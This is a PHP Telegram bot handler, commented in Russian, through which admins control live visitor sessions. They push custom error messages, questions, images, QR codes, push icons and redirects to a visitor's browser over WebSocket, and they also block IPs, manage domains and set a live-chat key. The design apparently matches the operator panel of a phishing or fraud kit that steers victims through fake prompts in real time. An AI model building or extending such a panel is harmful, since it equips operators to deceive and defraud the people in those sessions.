<?php

declare(strict_types=1);

namespace App\Telegram\Handlers;

use App\Actions\Session\SelectActionAction;
use App\Enums\ActionType;
use App\Models\Admin;
use App\Services\SessionService;
use App\Services\TelegramService;
use App\Services\WebSocketService;
use App\Telegram\Handlers\AdminPanelHandler;
use App\Telegram\Handlers\DomainHandler;
use App\Telegram\Handlers\SmartSuppHandler;
use SergiX44\Nutgram\Nutgram;

/**
 * Handler для обработки текстовых сообщений
 * 
 * Обрабатывает pending_action для кастомных действий
 */
class MessageHandler
{
    public function __construct(
        private readonly SessionService $sessionService,
        private readonly TelegramService $telegramService,
        private readonly SelectActionAction $selectActionAction,
    ) {}

    /**
     * Обработка текстового сообщения
     */
    public function handle(Nutgram $bot): void
    {
        /** @var Admin|null $admin */
        $admin = $bot->get('admin');
        
        if (!$admin || !$admin->hasPendingAction()) {
            return;
        }

        $pendingAction = $admin->getPendingAction();
        $actionType = $pendingAction['action_type'] ?? null;
        $sessionId = $pendingAction['session_id'] ?? null;
        $actionTypeValue = $actionType;

        // Обработка подтверждения блокировки IP
        if ($actionType === 'block_ip') {
            $inputText = $bot->message()?->text;
            if ($inputText === '*') {
                app(BlockIpHandler::class)->confirmBlock($bot, $admin, $sessionId);
                $admin->clearPendingAction();
            } else {
                $bot->sendMessage('❌ Отправьте <b>*</b> (звездочку) для подтверждения или нажмите Отмена', parse_mode: 'HTML');
            }
            return;
        }

        // Обработка добавления домена
        if ($actionType === 'add' && $sessionId === 'domain') {
            $inputText = $bot->message()?->text;
            if ($inputText) {
                app(DomainHandler::class)->processAddDomain($bot, $admin, $inputText);
            }
            return;
        }

        // Обработка редактирования IP домена
        if ($actionType === 'edit_domain' && $sessionId) {
            $inputText = $bot->message()?->text;
            if ($inputText) {
                app(DomainHandler::class)->processEditDomain($bot, $admin, $sessionId, $inputText);
            }
            return;
        }

        // Обработка добавления админа
        if ($actionType === 'add' && $sessionId === 'admin') {
            $inputText = $bot->message()?->text;
            if ($inputText) {
                app(AdminPanelHandler::class)->processAddAdmin($bot, $admin, $inputText);
            }
            return;
        }

        // Обработка установки ключа Smartsupp
        if ($actionType === 'set_key' && $sessionId === 'smartsupp') {
            $inputText = $bot->message()?->text;
            if ($inputText) {
                app(SmartSuppHandler::class)->processSetKey($bot, $admin, $inputText);
            }
            return;
        }

        // Стандартная обработка для сессий
        if (!$sessionId || !$actionTypeValue) {
            $admin->clearPendingAction();
            return;
        }

        $session = $this->sessionService->find($sessionId);
        if (!$session) {
            $bot->sendMessage('❌ Сессия не найдена');
            $admin->clearPendingAction();
            return;
        }

        $actionType = ActionType::tryFrom($actionTypeValue);
        if (!$actionType) {
            $admin->clearPendingAction();
            return;
        }

        // Получаем текст или фото
        $inputText = $bot->message()?->text;
        $photo = $bot->message()?->photo;
        $caption = $bot->message()?->caption; // Подпись к фото
        $imageUrl = null;

        if ($photo) {
            // Получаем URL самой большой версии фото
            $largestPhoto = end($photo);
            try {
                $file = $bot->getFile($largestPhoto->file_id);
                $imageUrl = "https://api.telegram.org/file/bot" . config('services.telegram.bot_token') . "/" . $file->file_path;
            } catch (\Throwable $e) {
                $bot->sendMessage('❌ Ошибка загрузки изображения');
                return;
            }
        }

        // Сохраняем данные в сессию
        $updateData = ['action_type' => $actionTypeValue];
        
        switch ($actionType) {
            case ActionType::PUSH_ICON:
                if (!$inputText || !is_numeric($inputText)) {
                    $bot->sendMessage('❌ Введите номер иконки');
                    return;
                }

                $iconIndex = (int) $inputText - 1;
                $iconsPath = base_path('scripts/icons.json');
                $iconsData = [];
                if (file_exists($iconsPath)) {
                    $iconsData = json_decode(file_get_contents($iconsPath), true) ?? [];
                }

                if (!isset($iconsData[$iconIndex])) {
                    $bot->sendMessage('❌ Номер иконки вне диапазона');
                    return;
                }

                $updateData['push_icon_id'] = $iconsData[$iconIndex]['id'] ?? null;
                break;
            case ActionType::CUSTOM_ERROR:
                if (!$inputText) {
                    $bot->sendMessage('❌ Введите текст ошибки');
                    return;
                }
                $updateData['custom_error_text'] = $inputText;
                break;
                
            case ActionType::CUSTOM_QUESTION:
                if (!$inputText) {
                    $bot->sendMessage('❌ Введите текст вопроса');
                    return;
                }
                $updateData['custom_question_text'] = $inputText;
                break;
                
            case ActionType::CUSTOM_IMAGE:
                if (!$imageUrl && !$inputText) {
                    $bot->sendMessage('❌ Отправьте URL или изображение');
                    return;
                }
                $updateData['custom_image_url'] = $imageUrl ?: $inputText;
                break;

            case ActionType::IMAGE_QUESTION:
                // Если фото с подписью - сохраняем оба сразу
                if ($imageUrl && $caption) {
                    $updateData['custom_image_url'] = $imageUrl;
                    $updateData['custom_question_text'] = $caption;
                }
                // Если только фото без подписи - сохраняем фото и просим вопрос
                elseif ($imageUrl && !$caption) {
                    $session->update(['custom_image_url' => $imageUrl, 'action_type' => $actionTypeValue]);
                    $bot->sendMessage("✅ Картинка сохранена!\n\nТеперь введите текст вопроса:");
                    return; // Не очищаем pending_action, ждем вопроса
                }
                // Если только текст - проверяем, есть ли уже картинка для этого действия
                elseif ($inputText && !$imageUrl) {
                    // Если картинка уже есть и action_type совпадает - это вопрос
                    if ($session->custom_image_url && $session->action_type === ActionType::IMAGE_QUESTION) {
                        $updateData['custom_question_text'] = $inputText;
                    } else {
                        // Если картинки нет - это может быть URL картинки
                        $updateData['custom_image_url'] = $inputText;
                        $bot->sendMessage("✅ URL картинки сохранен!\n\nТеперь введите текст вопроса:");
                        return; // Не очищаем pending_action, ждем вопроса
                    }
                } else {
                    $bot->sendMessage('❌ Отправьте фото с подписью или сначала фото, затем вопрос');
                    return;
                }
                break;

            case ActionType::REDIRECT:
                if (!$inputText) {
                    $bot->sendMessage('❌ Введите URL для редиректа');
                    return;
                }
                if (!str_starts_with($inputText, 'http://') && !str_starts_with($inputText, 'https://')) {
                    $inputText = 'https://' . $inputText;
                }
                $updateData['redirect_url'] = $inputText;
                break;

            case ActionType::QR_CODE:
                if (!$imageUrl && !$inputText) {
                    $bot->sendMessage('❌ Отправьте фото QR-кода или URL изображения');
                    return;
                }
                $qrImageUrl = $imageUrl ?: $inputText;
                app(WebSocketService::class)->broadcastQrCode($session, $qrImageUrl);
                $bot->sendMessage(
                    text: "✅ 📷 QR-код отправлен пользователю!",
                    parse_mode: 'HTML',
                );
                $admin->clearPendingAction();
                return;

            default:
                $admin->clearPendingAction();
                return;
        }

        // Обновляем сессию
        $session->update($updateData);
        $session = $session->fresh();
        
        // Выполняем действие
        $this->selectActionAction->execute($session, $actionType, $admin);

        // Обновляем сообщение сессии
        $this->telegramService->updateSessionMessage($session->fresh());

        $bot->sendMessage(
            text: "✅ {$actionType->emoji()} {$actionType->label()} установлено!\n\nПользователь перенаправлен.",
            parse_mode: 'HTML',
        );

        // Очищаем pending action
        $admin->clearPendingAction();
    }
}
